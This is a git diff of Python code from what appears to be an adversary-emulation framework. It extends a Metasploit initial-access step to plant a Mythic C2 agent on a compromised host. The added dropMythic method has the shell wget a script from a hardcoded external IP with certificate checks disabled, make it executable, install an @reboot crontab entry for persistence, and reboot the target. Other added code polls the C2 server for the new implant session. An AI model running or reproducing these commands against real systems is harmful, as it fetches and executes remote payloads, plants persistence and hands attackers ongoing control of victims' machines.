@@ -1,9 +1,9 @@
 from __future__ import annotations
 from typing import TYPE_CHECKING
 if TYPE_CHECKING:
-    from Operations.Client import Client, C2Client
+    from Shells.Client import Client, C2Client
     from Operations.Operation import Operation
-    from Operations.MetasploitShell import MetasploitC2, MetasploitShell
+    from Shells.MetasploitShell import MetasploitC2, MetasploitShell
 from Attacks.InitialAccessAttack import InitialAccessAttack
 from Data.Techniques.Database import Database
 from Data.Techniques.ServiceData import ServiceData
@@ -14,6 +14,7 @@ import xml.etree.ElementTree as ET
 from Data.Techniques.ClientsData import ClientsData
 from pymetasploit3.msfrpc import *
 import time
+from Shells.MythicClient import MythicClient, MythicC2
 
 # This is intended to be run on the starting malicious attacker client
 
@@ -101,4 +102,54 @@ class MetasploitAttack(InitialAccessAttack):
         #output = self.exploitModule.execute()
         metasploitShell = metasploitServer.getLatestSession(targetHost.ipAddress)
         targetHost.c2Shells.append(metasploitShell)
+        await self.dropAndRegisterMythic(operation, metasploitShell)
         return
+    
+    async def dropAndRegisterMythic(self, operation: Operation, metasploitShell: MetasploitShell):
+        await self.dropMythic(metasploitShell)
+        ipAddress = metasploitShell.getIPAddress()
+        client = await self.getLatestMythicClientOfIP(operation.mythicServer, ipAddress)
+        TWO_MINUTES = 120
+        await self.waitForRebootToFinish(TWO_MINUTES, ipAddress, operation.mythicServer)
+        operation.clientsData.getClientData(ipAddress).c2Shells.append(client)
+
+    async def dropMythic(self, metasploitShell: MetasploitShell):
+        #https://34.237.94.238:7443/direct/download/78c9b5c4-19e8-4d96-8725-6881c598c1e6
+        metasploitShell.executeShell("cd")
+        metasploitShell.executeShell("wget https://34.237.94.238:7443/direct/download/ffd4065a-414c-415b-8482-0c53f82e2157 -O spear.sh --no-check-certificate")
+        metasploitShell.executeShell("chmod +x spear.sh")
+        metasploitShell.executeShell("""(crontab -l 2>/dev/null; echo "@reboot ~/spear.sh &") | crontab -""")
+        metasploitShell.executeShell("reboot")
+
+    # Todo: This doesn't work
+    async def waitForRebootToFinish(self, secondsToWait: int, ipAddress: str, mythicServer: MythicC2):
+        # Todo: Use NMAP scan to detect when reboot finished
+        # Todo: Currently just waits a set amount of time
+        currentTime = time.time()
+        endTime = time.time() + secondsToWait
+        hasClient = False
+        originalClient = await self.getLatestMythicClientOfIP(mythicServer, ipAddress)
+        while (currentTime < endTime) and not hasClient:
+            try:
+                retrivedClient = await self.getLatestMythicClientOfIP(mythicServer, ipAddress)
+                # Todo: Bug possibly, may not be able to compare this way
+                if(originalClient == retrivedClient):
+                    currentTime = time.time()
+                    continue
+                hasClient = True
+            except Exception as e:
+                continue
+
+    async def getLatestMythicClientOfIP(self, mythicServer: MythicC2, ipAddress: str):
+        clients = await mythicServer.getActiveClients()
+
+        mostRecentClient: MythicClient = None
+        for client in clients:
+            clientIP = await client.getIPAddress()
+            if(clientIP != ipAddress):
+                continue
+
+            if(mostRecentClient == None or mostRecentClient.displayID < client.displayID):
+                mostRecentClient = client
+
+        return mostRecentClient
